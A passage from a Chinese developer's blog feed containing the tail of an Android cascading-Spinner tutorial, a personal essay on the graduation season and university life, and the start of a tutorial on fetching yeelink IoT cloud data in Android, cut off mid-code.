.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);</div><div class="line">        mProvinceSpinner.setAdapter(mProvinceAdapter);</div><div class="line"></div><div class="line">        mProvinceSpinner</div><div class="line">                .setOnItemSelectedListener(<span class="keyword">new</span> OnItemSelectedListener() &#123;</div><div class="line"></div><div class="line">                    <span class="meta">@Override</span></div><div class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemSelected</span><span class="params">(AdapterView&lt;?&gt; arg0, View arg1,</span></span></div><div class="line">                            <span class="keyword">int</span> arg2, <span class="keyword">long</span> arg3) &#123;</div><div class="line">                        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                        <span class="comment">// 获取省的ID</span></div><div class="line">                        mProvinceId = mProvinceSpinner</div><div class="line">                                .getSelectedItemPosition();</div><div class="line">                        <span class="comment">// 获取省的名字</span></div><div class="line">                        mProvinceName = mProvinceSpinner.getSelectedItem()</div><div class="line">                                .toString();</div><div class="line">                        <span class="comment">// 市选择</span></div><div class="line">                        SpinnerBindResource(mCitySpinner, mCityAdpater,</div><div class="line">                                city[mProvinceId]);</div><div class="line">                        mCitySpinner</div><div class="line">                                .setOnItemSelectedListener(<span class="keyword">new</span> OnItemSelectedListener() &#123;</div><div class="line"></div><div class="line">                                    <span class="meta">@Override</span></div><div class="line">                                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemSelected</span><span class="params">(</span></span></div><div class="line">                                            AdapterView&lt;?&gt; arg0, View arg1,</div><div class="line">                                            <span class="keyword">int</span> arg2, <span class="keyword">long</span> arg3) &#123;</div><div class="line">                                        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line">                                        <span class="comment">// 获取市的ID</span></div><div class="line">                                        mCityId = mCitySpinner</div><div class="line">                                                .getSelectedItemPosition();</div><div class="line">                                        <span class="comment">// 获取市的名字</span></div><div class="line">                                        mCityName = mCitySpinner</div><div class="line">                                                .getSelectedItem().toString();</div><div class="line">                                        <span class="comment">// 县选择</span></div><div class="line">                                        <span class="keyword">switch</span> (mProvinceId) &#123;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">0</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfBeiJing[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfTianJing[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfHeBei[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">3</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfShanXi1[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">4</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfNeiMengGu[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">5</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfLiaoNing[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">6</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfJiLin[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">7</span>:</div><div class="line">                                            SpinnerBindResource(</div><div class="line">                                                    mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfHeiLongJiang[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">8</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfShangHai[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">9</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfJiangSu[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">10</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfZheJiang[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">11</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfAnHui[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">12</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfFuJian[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">13</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfJiangXi[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">14</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfShanDong[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">15</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfHeNan[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">16</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfHuBei[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">17</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfHuNan[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">18</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfGuangDong[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">19</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfGuangXi[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">20</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfHaiNan[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">21</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfChongQing[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">22</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfSiChuan[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">23</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfGuiZhou[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">24</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfYunNan[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">25</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfXiZang[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">26</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfShanXi2[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">27</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfGanSu[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">28</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfQingHai[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">29</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfNingXia[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">30</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfXinJiang[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">31</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfHongKong[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">32</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfAoMen[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        <span class="keyword">case</span> <span class="number">33</span>:</div><div class="line">                                            SpinnerBindResource(mCountySpinner,</div><div class="line">                                                    mCountyAdapter,</div><div class="line">                                                    countyOfTaiWan[mCityId]);</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">                                        <span class="keyword">default</span>:</div><div class="line">                                            <span class="keyword">break</span>;</div><div class="line">                                        &#125;</div><div class="line"></div><div class="line">                                        mCountySpinner</div><div class="line">                                                .setOnItemSelectedListener(<span class="keyword">new</span> OnItemSelectedListener() &#123;</div><div class="line"></div><div class="line">                                                    <span class="meta">@Override</span></div><div class="line">                                                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onItemSelected</span><span class="params">(</span></span></div><div class="line">                                                            AdapterView&lt;?&gt; arg0,</div><div class="line">                                                            View arg1,</div><div class="line">                                                            <span class="keyword">int</span> arg2, <span class="keyword">long</span> arg3) &#123;</div><div class="line">                                                        <span class="comment">// TODO Auto-generated</span></div><div class="line">                                                        <span class="comment">// method stub</span></div><div class="line">                                                        mCountyName = mCountySpinner</div><div class="line">                                                                .getSelectedItem()</div><div class="line">                                                                .toString();</div><div class="line">                                                        Toast.makeText(</div><div class="line">                                                                MainActivity.<span class="keyword">this</span>,</div><div class="line">                                                                <span class="string">"你选择的是："</span></div><div class="line">                                                                        + mProvinceName</div><div class="line">                                                                        + <span class="string">"-"</span></div><div class="line">                                                                        + mCityName</div><div class="line">                                                                        + <span class="string">"-"</span></div><div class="line">                                                                        + mCountyName,</div><div class="line">                                                                Toast.LENGTH_SHORT)</div><div class="line">                                                                .show();</div><div class="line">                                                    &#125;</div><div class="line"></div><div class="line">                                                    <span class="meta">@Override</span></div><div class="line">                                                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onNothingSelected</span><span class="params">(</span></span></div><div class="line">                                                            AdapterView&lt;?&gt; arg0) &#123;</div><div class="line">                                                        <span class="comment">// TODO Auto-generated</span></div><div class="line">                                                        <span class="comment">// method stub</span></div><div class="line"></div><div class="line">                                                    &#125;</div><div class="line">                                                &#125;);</div><div class="line">                                    &#125;</div><div class="line"></div><div class="line">                                    <span class="meta">@Override</span></div><div class="line">                                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onNothingSelected</span><span class="params">(</span></span></div><div class="line">                                            AdapterView&lt;?&gt; arg0) &#123;</div><div class="line">                                        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line"></div><div class="line">                                    &#125;</div><div class="line">                                &#125;);</div><div class="line">                    &#125;</div><div class="line"></div><div class="line">                    <span class="meta">@Override</span></div><div class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onNothingSelected</span><span class="params">(AdapterView&lt;?&gt; arg0)</span> </span>&#123;</div><div class="line">                        <span class="comment">// TODO Auto-generated method stub</span></div><div class="line"></div><div class="line">                    &#125;</div><div class="line">                &#125;);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// 数据绑定</span></div><div class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SpinnerBindResource</span><span class="params">(Spinner spinner,</span></span></div><div class="line">            ArrayAdapter&lt;CharSequence&gt; adapter, <span class="keyword">int</span> arrayId) &#123;</div><div class="line">        adapter = ArrayAdapter.createFromResource(<span class="keyword">this</span>, arrayId,</div><div class="line">                android.R.layout.simple_spinner_item);</div><div class="line"></div><div class="line">        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);</div><div class="line">        spinner.setAdapter(adapter);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h4><p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/1-1.jpg" alt="1-1"><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/7/1-2.jpg" alt="1-2"></p>
<p>　　注：如果需要源码可以联系我，联系方式在主页可看到。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>Spinner</tag>
      </tags>
  </entry>
  <entry>
    <title>六月，毕业季 - 感恩有你</title>
    <url>/2016/07/01/%E5%85%AD%E6%9C%88%EF%BC%8C%E6%AF%95%E4%B8%9A%E5%AD%A3%20-%20%E6%84%9F%E6%81%A9%E6%9C%89%E4%BD%A0/</url>
    <content><![CDATA[<p>　　都说毕业遥遥无期，转眼就要各奔东西。又到毕业季，从在外实习的学长学姐回到学校，到学长学姐忙毕业论文，再到好多的送别宴，到最后的毕业典礼，到离别，这一段时间感触很多，但是一直没有记录下来，现在是时候写一写了。虽然不是我自己毕业了，但是还是有很多很多感触。毕竟是最亲的一届学长学姐，很多很亲近很熟悉的人就要离开了，说不定以后也很难再相见，也因为过完这个学期就是准大四学生了，一年后就是我们的毕业。</p>
<a id="more"></a> 
<p>　　毕业典礼的第二天，蚯蚓学姐离开了学校，也是那天，算是大学最后一门正正规规的课，最后一次课程设计答辩也结束了。那天，答辩完，下楼就碰到了我们的助班学姐，她马上就要离校，匆匆忙忙拍了一张合照。突然觉得好伤感，学长学姐毕业，我们大学基本的课程结束，真的有很多很多要想说的话。</p>
<p>　　大一报道是一个人来的学校，从高铁站坐的农大校车到修业广场，来到这个陌生的地方，是助班学姐和一位学长帮我提行李，送我到寝室去的。一路上学姐给我各种介绍，特别清楚记得图书馆西边的小坡有几个由小树修剪成的校训：朴诚、奋勉、求实、创新，时至今日，我依然牢记。之后的军训，对于不常锻炼的我来说确实比较艰难，但是因为有大家一起，也因为有助班学长学姐的关心，我才坚持下来。不能说军训有多么多么的值得怀恋，毕竟我不是特别喜欢军训的人，但是记得有句话：所有的事情都有他存在的意义。或许也是军训这段时间让给我们懂得吃苦耐劳，结奋斗吧！军训结束，班级聚餐，大家各种喝酒，也于是大家慢慢熟悉起来。</p>
<p>　　国庆之后，随着大学正式开课、学生会招新等，我的大学生活也真正开始了。先说说组织部吧，我爱了三年的部门。我的助班蚯蚓学姐是我的部长，在这个部门她教给我很多的东西，最重要的应该是为人处世，有些东西真的就是耳濡目染，慢慢的会领悟很多。组织部的常规活动就是民主生活会了，说不出什么特别的地方，每两周一次的活动，组织部是作为检查打分的角色出现的，一开始还很有兴致，但是慢慢的也就觉得没什么意思了，然后还有一些比如收团费、团干培训等等事情，其实很多事情都是部长副部帮我们做了，只怪学姐们太能干，哈哈。最开心的当然还是部长带我们出去浪吧，去吃饭唱歌，记得部门最后一次是在市里的，在湘江边吃的饭，然后去唱了晚晚场，很开心，也很难忘。大一下学期，从懵懂的小屁孩也开始懂得了一些事情，一届学生会结束，昔日一起做事一起玩耍的小伙伴以后就很难有这样的机会了。</p>
<p>　　生活部的话，我的部长虎哥，副部诚哥、兰姐都对我很好。当干事的一年里，也是没什么特别的地方，每周一早上去早检，也就是叫学长学姐起床，然后检查宿舍卫生，还是很佩服自己大一的时候，也是从那时候培养的一种精神吧，冬天的早检是很痛苦的，天还没亮就要出发，但是不管多么冷，我都可以坚持从芷兰到金岸去早检。一直觉得生活部还是挺温馨的，有一个热心的部长，然后人也很多，经常能聚聚餐，喝酒也算是常态了，也有喝醉的时候，但是还是很开心，毕竟大家像一个温馨的大家庭。虽然可能到现在很多人都已经不熟悉了，但是至少大家以前都在生活部待过，都有过这段美好的回忆。</p>
<p>　　大一下学期，在图书馆大成厅，实验室招新宣讲会。学院几大实验室的指导老师都来宣传自己的实验室，曾炼成老师结合之前实验室的一些作品宣传了电子设计创新实验室，就在那时，我觉得这就是我要去的地方。现在回想起来，其实很多事情真的就是一种缘分，说不上什么很特别的理由。会后，我给曾老师打了电话表达了我想要加入电子设计创新实验室的想法，然后他让我找陈刚老师，再然后陈老师让我去找欧超学长，就这样，没有面试没有考核就这样进来啦。进来以后才知道，原来这个实验室已经很久没人管了，但是还是有一批学长学姐在这里学技术。虽然和想象的有区别也有点失望，但是欧超学长的热情与真诚打动了我，也是他带着我从零开始学习单片机，带我去图书馆找资料，给我拷视频资料，拿单片机开发板给我用，后来还给了我实验室的钥匙。经过一段时间的学习，我对单片机已经有了大体的一些了解，也开始真正了解大学应该学些什么。现在回想起来，其实当时的这一步对我来说真的非常重要，没有这些经历，我也不会这么快懂得要学习什么，怎么学习。</p>
<p>　　大二期间，担任班长、院学生会组织部副部长。其实，在开始的竞选中发生了很多不愉快的事情，但是还好最后的结果大家都还算满意。这一年里，班长、院学生会组织部副部长两个职务，也是对自己全新的挑战吧。作为班长，我想尽各种办法让班上同学能够认真学习专业知识，积极联系老师，积极开展导师制，积极完成学工老师交代的任务，积极带领班上同学搞活动、搞学习，一年下来，感觉很多事情都白做了，自己收获的很多，但是班级并没有很大的改观。其实，真的，大学关键还是靠自己，自己不动，别人怎么给你想办法都没用。作为组织部的副部长，积极配合我的部长的工作，带领几个小干事一起干活。天才第一步，进我组织部，这是蚯蚓学姐为组织部想的宣传语，沿用至今。很庆幸能够在组织部遇到这群人，我的领导善解人意、办事能力强，几位小干事也都很听话，感觉就是一个温馨的大家庭。现在看到他们越来越好我也是很开心的，毕竟我们永远是一家人。很遗憾的是我们部门在这个毕业季没能和我们上届的部长，也就是蚯蚓学姐吃一顿饭了，学姐真的是太忙了，档期安排的满满的，到最后也没找到机会一起。</p>
<p>　　也是在大二，我慢慢的开始适应实验室的环境，它没有图书馆压抑的气氛，在这里我们动手做实验，学习电子设计方面的知识，思维可以放得很开，网络也很方便，可以迅速的查阅资料，在这里我获得了前所未有的信息量，很大程度上开阔了视野。欧超、杨勇锋等几位学长策划着建立一个电子协会，也开始带着手实验室的招新工作。这一年，实验室招了30个13级学生，几位学长负责每周为我们讲课，因为这个平台我和后来一起带实验室和协会的搭档尹远和张涛开始熟知。也是这一年实验室获得了不错的发展，有了电子协会这个宣传的平台，实验室也开始被学弟学妹们所了解。学长们乐于奉献的精神也给我很大的影响，也是我接手实验室之后一直努力想把实验室建设好的原因吧，希望这种精神能够延续下去。同时，由于大二的数据结构课程，卧铺有幸认识了我的恩师戴教授，并开始在他的指导下接触科研。他是一个个踏踏实实搞教学和科研的人，他认真严谨的态度一直感染着我，也是他带着我写论文、学安卓、玩树莓派、报科创项目，能够耐心的听我讲我最新了解到的知识，和我一起聊技术方面的事情，也时常给我推荐各种书籍和资料。其实，让我最感动的还是他的倾听，因为在大学里很多教授都是很难见到的，但是每次他都能耐心的听我讲完并给我一些建议，在技术上算是一个知己吧。很多次在他办公室看到他在学习新的知识，也会看到他为了备课经常下载更多的资料以及自己看慕课来完善自己的课堂，这些在我看来都是很难得的。他的不断学习的意识以及认真严谨的学术态度让我很佩服，所以我也愿意一直跟着他学习，希望以后能成为像他这样优秀的人。</p>
<p>　　大三开始，真正接手实验室。说实话，一开始真的很无助，以前都是超哥和锋哥担当起很多的责任，实验室、协会上课都是他们在负责，但是他们已经去深圳参加嵌入式的培训了，剩下维哥也在学校准备找工作去实习了，不知道怎么办。不过，还好，上天总是眷顾努力的人们，就在这时候匡老师来了，她要来带一带实验室，匡老师的热情与真诚让我看到了希望，之后的很多事情很多安排都是她在做，包括实验室的规划、指导老师的调动等。于是，我也有了信心，在没有什么带过学弟学妹的经验的情况下，我平时积极学习，每周都积极备课，希望大家来了就能有收获，也邀请了维哥、能神来给大家讲课，总的来说，虽然我讲课确实讲得不好，讲得快，没有意识到大家是否听懂，但是至少在我带的这段时间，很多安排都在井井有条的进行，自我感觉还是很有希望的，实验室的学习气氛还是获得了其他老师的认可，也是因为大三上学期的积累，大三下学期的蓝桥杯才能取得不错的成绩。为了蓝桥杯，我确实付出了很多，画板子、调板子、再到安排大家焊接，已经之后各个模块的熟悉，确实花了很多时间。当初，毫无保留的把自己学会的与大家分享，也是希望大家都能在比赛中获得好的成绩。还好，我的付出也算有了回报，努力的人们都取得了不错的成绩，我自己也拿了省一等奖，获得去北京参加决赛的机会。去北京的经历已经很详细的记录在另一篇博客了，这里就略过吧。这其中也还是很感谢实验室各位老师的辛勤付出吧，特别是匡老师和陈老师，一个负责组织，一个负责技术，也挺好的啦！有时候，回想起来，这一段路有心酸、有泪水也有感动吧，当你一个人默默付出的时候，别人可能并不知道，但是在收获的时候你一定是最幸福的。</p>
<p>　　最近想尽办法让自己静下来好好复习，也买了很多书准备看看。这学期真的忙了很多的事情，一直想参加更多的比赛，想拿更多的奖，但是到头来发现过程中的收获比结果重要很多，虽然在有时候我们不得不拿出些奖励来获得别人的认可，但是我现在更希望自己具备真正的实力。不积跬步，无以至千里，不积小流，无以成江海，与其参加更多意义并不大的比赛，还不如静下来好好学知识学技术，这样不管对于找工作还是考研都是很有帮助的。到现在，很多事情都不想去做了，只想安安静静的复习考研，所以7月在武汉的的智能互联大学分赛区决赛我也不准备去了。为了让自己能够静下来好好复习我也确实放弃了很多东西，有时候也会觉得比较无奈吧。如果让我说大学三年来最大的遗憾是什么，我认为应该是我在大学没有找到一个好的团队，不是说怪队友怎么怎么，而是真的没有几个一起并肩奋斗的人，很多时候都是自己一个人在战斗，好几次比赛都是自己找的人，别人还不太乐意，团队没有共同的明确目标那很难走下去，有时候很绝望的是你想去做一个项目，别人却总是有各种事情，所以到现在我也慢慢明白了，确实大家都有各自的事情要忙，没有共同的目标又何苦要求别人一起来呢，这应该是我最近认识的最深刻的问题了。我是一个常常喜欢反思自己、思考问题的人，只是很多时候我并不喜欢表达出来，在别人看来这或许是我的缺点吧，但是有些想法确实不能说。</p>
<p>　　倒是还是很担心实验室，毕竟大家花了那么多心思才让实验室有一点起色，我不想让这一点点希望就这样没了，现在的情况让我很担忧，老师没时间来，学生也忙自己的事情，不主动，大概很久都没有听到实验室的动静了。有时候就是有那么一点点好强，总是去和其他实验室比较，看到这样的现状感觉很不爽，但是自己又不能改变什么。这两年真的把实验室当成了自己大学里的一个家了，在这里的成长与感动让我觉得大学过得很充实也很踏实，虽然不能在这里待一辈子，但是还是希望这个实验室能够越来越好。六月就这样结束了，大学前三年也就这样结束了，七月已经到来，现在的我只想好好复习准备考研或者找份好工作啦。</p>
<p>　　大学三年，只因有你们，我的大学生活才不平凡，感恩有你。虽然对这个地方还是有很多的不满，但是自己也在这里成长了三年，再多的抱怨也埋在心底好了。毕竟，我们的成长更多的是靠自己。大四，新的未来。学长学姐都毕业了，我们已经成为最老的老油条，慢慢的自己也获得了成长，但是每一次与学长学姐交流，都可以有新的收获，不管是对未来的一些了解，还是对自己现状的一些反思，我觉得虽然可能就是一次简单的聊天，但也可以对你产生一些无形的影响。最后，祝各位毕业的学长学姐前程似锦，以后有机会再相聚！<br>​        </p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>Android 获取 yeelink 云端数据</title>
    <url>/2016/06/29/Android%20%E8%8E%B7%E5%8F%96%20yeelink%20%E4%BA%91%E7%AB%AF%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<p>　　虽然前段时间的项目我参与了硬件部分的调试，但是我主要还是负责 Android 客户端的开发。yeelink 是一个物联网云平台，我们可以采用单片机采集数据，然后将数据上传到 yeelink，再通过 Android 客户端去云端获取数据，以便实现远程监测。这篇博客主要讲解如何从 yeelink 云端获取单片机上传到 yeelink 云端的数据。</p>
<a id="more"></a>
<h4 id="查阅yeelink开发者文档"><a href="#查阅yeelink开发者文档" class="headerlink" title="查阅yeelink开发者文档"></a>查阅yeelink开发者文档</h4><p>　　要想查看云端数据，需使用 GET 方法，对<code>http://api.yeelink.net/v1.0/device/&lt;device_id&gt;/sensor/&lt;sensor_id&gt;/datapoint/&lt;key&gt;</code> 进行请求，对该 URL 的请求返回指定 key 的 datapoint，若未指定 key，则返回该 sensor 的最新数据。</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2016/6/28-1.jpg" alt="28-1"></p>
<h4 id="新建并配置工程"><a href="#新建并配置工程" class="headerlink" title="新建并配置工程"></a>新建并配置工程</h4><h5 id="添加网络访问权限"><a href="#添加网络访问权限" class="headerlink" title="添加网络访问权限"></a>添加网络访问权限</h5><p>　　在 AndroidManifest.xml 文件中加入如下：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">"android.permission.INTERNET"</span> /&gt;</span></div></pre></td></tr></table></figure>
<h5 id="编写布局文件"><a href="#编写布局文件" class="headerlink" title="编写布局文件"></a>编写布局文件</h5><p>　　添加一个 Button 用于获取数据，添加一个 TextView 用于显示获取到的数据。</p>
<h4 id="网络请求库android-async-http的使用"><a href="#网络请求库android-async-http的使用" class="headerlink" title="网络请求库android-async-http的使用"></a>网络请求库android-async-http的使用</h4><p>　　android-async-http 是一个强大的网络请求库，这个网络请求库是基于 Apache HttpClient 库之上的一个异步网络请求处理库，网络处理均基于 Android 的非 UI 线程，通过回调方法处理请求结果。</p>
<h5 id="jar包下载"><a href="#jar包下载" class="headerlink" title="jar包下载"></a>jar包下载</h5><p>　　点击此处可以下载 jar 包</p>
<h5 id="将jar包添加到工程"><a href="#将jar包添加到工程" class="headerlink" title="将jar包添加到工程"></a>将jar包添加到工程</h5><p>　　将 jar 包复制到 lib 文件夹下，并右键该 jar 包，<code>BuildPath--Add to Build Path</code></p>
<h5 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h5><p>　　新建一个 Http 工具类 <code>CloudHttpUtil</code>，再新建一个静态方法 <code>GetCloudData()</code>，该方法需要两个参数，一个是进行消息传递的 Handler，另一个是 Http 请求的 url 地址，具体代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CloudHttpUtil</span> </span>&#123;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetCloudData</span><span class="params">(<span class="keyword">final</span> Handler handler, String url)</span> </span>&#123;</div><div class="line"></div><div class="line">        AsyncHttpClient client = <span class="keyword">new</span> AsyncHttpClient();</div><div class="line">        <span class="comment">//添加Http请求的头部信息</span></div><div class="line">        client.addHeader(<span class="string">"U-ApiKey"</span>, <span class="string">"你的API密钥"</span>);    </div><div class="line">        <span class="comment">//使用get方法获取数据</span></div><div class="line">        client.get(url, <span class="keyword">new</span> AsyncHttpResponseHandler() &#123;</div><div class="line"></div><div class="line">            <span class="meta">@Override</span></div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onSuccess</span><span class="params">(<span class="keyword">int</span> i, Header[] headers, <span class="keyword">byte</span>[] bytes)</span> </span>&#123;</div><div class="line">                <span class="comment">// TODO 